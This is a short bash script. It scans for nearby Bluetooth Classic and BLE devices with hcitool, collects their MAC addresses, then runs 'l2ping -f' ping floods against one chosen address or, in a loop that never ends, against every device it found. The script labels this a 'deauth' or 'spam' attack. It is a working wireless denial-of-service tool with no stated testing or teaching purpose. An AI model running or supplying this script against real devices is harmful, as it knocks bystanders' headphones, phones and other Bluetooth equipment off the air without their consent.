#!/bin/bash

rm -f /tmp/scan_br.txt /tmp/scan_le.txt /tmp/scan_br_f.txt /tmp/scan_le_f.txt > /dev/null

format_scan () {
	grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$1" > "$2"
}

read -p "scan mode? (1: BR/EDR | 2: BLE | 3: ALL): " scan_mode

sudo systemctl restart bluetooth # Restarts the bluetooth service to avoid hcitool errors
sleep 2

if [ ${scan_mode} = "1" ]; then
	sudo stdbuf -oL hcitool -i "$INTERFACE_BT" scan | tee /tmp/scan_br.txt
	format_scan "/tmp/scan_br.txt" "/tmp/scan_br_f.txt"

elif [ ${scan_mode} = "2" ]; then
	echo "Press ctrl+c to stop scan"
	sudo stdbuf -oL hcitool -i "$INTERFACE_BT" lescan | tee /tmp/scan_le.txt
	format_scan "/tmp/scan_le.txt" "/tmp/scan_le_f.txt"

elif [ ${scan_mode} = "3" ]; then
	sudo stdbuf -oL hcitool -i "$INTERFACE_BT" scan | tee /tmp/scan_br.txt
        timeout 10 sudo stdbuf -oL hcitool -i "$INTERFACE_BT" lescan | tee /tmp/scan_le.txt
	format_scan "/tmp/scan_br.txt" "/tmp/scan_br_f.txt"
	format_scan "/tmp/scan_le.txt" "/tmp/scan_le_f.txt"
else
	echo "Enter a valid mode"
	exit 1
fi

read -p "deauth mode? (1: Spam selected mac | 2: Spam all): " deauth_mode

if [ ${deauth_mode} = "1" ]; then
	read -p "mac address?: " mac
	echo "Press ctrl+z/ctrl+c to force-stop the flood"
	sudo l2ping -f "$mac"
	
elif [ ${deauth_mode} = "2" ]; then
	echo "Press ctrl+z/ctrl+c to force-stop the flood"
	while true; do
		while IFS= read -r line; do # Reads an input from a file line-by-line
			echo "Now flooding: $line"
			timeout 10 sudo l2ping -f "$line"
		done < /tmp/scan_br_f.txt
		while IFS= read -r line; do # Do that a second time for LE
			echo "Now flooding: $line"
			timeout 10 sudo l2ping -f "$line"
		done < /tmp/scan_le_f.txt
	done
else
	echo "Enter a valid mode"
	exit 1
fi
